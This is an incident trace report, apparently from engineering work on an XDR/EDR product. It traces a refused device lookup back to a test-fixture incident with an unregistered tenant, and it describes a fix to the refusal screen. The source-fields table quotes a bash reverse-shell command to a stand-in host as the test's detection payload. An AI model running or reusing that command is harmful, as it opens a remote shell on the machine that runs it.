# inc_e2eb6978efca42aa88a7 · where `ep_f` and `p0f-c375caa0` came from

Read-only trace. No record was created, altered or deleted, and no tenant
authorization was changed.

## Verdict

**Expected test-data limitation — not an incorrect tenant/device mapping.**
XDR passed on exactly what the incident record states; EDR correctly refused,
because nothing in that record was ever registered in the EDR control plane.

## The source fields

`workspace_cases/inc_e2eb6978efca42aa88a7` (`doc_type: xdr_incident`):

| field | value |
|---|---|
| `tenant_id` | `p0f-c375caa0` |
| `endpoint_campaign.endpoint_id` | `ep_f` |
| `endpoint_campaign.hostname` | `lab-01` |
| `endpoint_campaign.detections[0].command_line` | `/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444` |
| `xdr_pipeline.trace_id` | `raw_67fc13fa830dfdeb8c46a613` |
| `provenance` | `PROVENANCE_UNKNOWN`, `provenance_is_real: false` |
| `created_at` = `updated_at` | `2026-10-31T17:55:31.272472+00:00` |

The incident carries no `ssot.investigation_object` at all, so `ep_f` and
`lab-01` come only from `endpoint_campaign`.

## Where those literals are written

`backend/tests/edr/test_p0_f_endpoint_detection.py`,
`test_bridge_records_the_detection_outcome_on_the_raw_event` (lines 213–251):

```python
tenant = f"p0f-{uuid.uuid4().hex[:8]}"          # → p0f-c375caa0
ev = RawEndpointEvent.build(tenant_id=tenant, source="ep_f", …)
out = await bridge(db, raw_id=ev.raw_id, tenant_id=tenant, payload=payload,
                   endpoint_id="ep_f", hostname="lab-01",
                   authentication={"authenticated_endpoint_id": "ep_f"})
```

The command line in the incident's detection is this test's payload, verbatim.
`p0f` = the **P0-F** proof suite; the tenant is a fresh UUID per test run, so
`p0f-c375caa0` belonged to one run on 2026-10-31 17:55 and nothing else.

The test's `finally` block deletes `edr_raw_events`, `v2_shadow_observations`,
`xdr_canonical_evidence` and `xdr_detection_matches` for its tenant — but **not**
`workspace_cases`. The incident the pipeline promoted therefore outlives all of
its own evidence. That is why `raw_67fc13fa830dfdeb8c46a613` **no longer exists**.

## Does `ep_f` identify `lab-01` for that customer?

Only inside that one function call. Nothing was ever registered:

| lookup | result |
|---|---|
| `edr_endpoints` where endpoint/device = `ep_f` | **0** |
| `edr_endpoints` in tenant `p0f-c375caa0` | **0** |
| `edr_endpoints` with hostname `lab-01` | **0** |
| `tenants` matching `p0f-c375caa0` (166 registered) | **0** |
| `edr_raw_events` for the cited trace id | **not found** |

Across all 427 `p0f*` tenants: **438 incidents, 0 registered endpoints, 0 raw
events, 13 orphan canonical-evidence documents.**

## Should EDR recognize the customer in preview?

**No.** The backend states the rule itself in its refusal:

> tenant is not registered (edr.control_plane). tenancy is established only by
> `POST /api/xdr/tenants`; collector creation, API-key creation, endpoint
> enrolment, telemetry and incident creation never create a tenant

The P0-F test writes a tenant id onto documents; it never registers a tenant, by
design. Registering `p0f-c375caa0` now would manufacture a customer to satisfy a
deleted fixture, so **nothing was changed**.

## A second defect this trace exposes

The incident's timestamp is its **test run time** (2026-10-31 17:55), while the
payload it describes was observed `2026-06-06T11:00:00+00:00`. Even if the
evidence still existed and the tenant were registered, the link would open
31 October — the wrong day. This affects fixture incidents whose promotion time
replaces the observation time; it was not introduced by the cross-product link.
No code change was made for it (read-only task).

## The refusal screen (commit `8a543f9e`)

Before: the denial banner sat on top of a fully mounted canvas — ATT&CK strip
reading "Loading ATT&CK mapping…", `0` indicators across every lane, a device
**Actions** menu, an events-loaded counter and an empty timeline. Unavailable
evidence looked like a completed investigation of a quiet endpoint.

Now a refused read **is** the page. Verified on the shared preview with the real
link from this incident:

| check | result |
|---|---|
| `v3-page[data-refused]` | `DENIED` |
| `dt-attack-strip` · `v3-toolbar` · `v3-workspace` · `v3-status-bar` · `v3-actions` · `v3-loaded-count` · `v3-activity-panel` | **0 each** |
| "Loading ATT&CK mapping" in the body | **false** |
| message | *Access denied* + the backend's own reason |
| requested | `device ep_f · 2026-10-31 00:00 – 2026-11-01 00:00 UTC` |
| meaning stated | "An empty trajectory here would not mean the device was quiet — it means nothing was returned to judge." |
| return link | `/xdr/incidents/inc_e2eb6978efca42aa88a7` |
| XDR tab | unchanged, still on the incident |

`NO_CUSTOMER` is deliberately excluded: the analyst only has to pick a customer,
so the canvas stays in place for them. 404 `NOT_RESOLVED` is treated as a refusal
too — there is equally no device to act on.

Screenshot: `screenshots/refused-read-8a543f9e.png`
Tests: 27 files · **389 passed** (3 new).

## Known duplication, not fixed

The console deep-link banner above the panel still shows
`CONTEXT ◇ CONTEXT_UNAVAILABLE` and its own *Return to NivXRay XDR incident*.
That is a different fact (the incident-context lookup was refused too) and the
banner is shared by every EDR deep link including successful ones, so it was left
alone rather than special-cased.
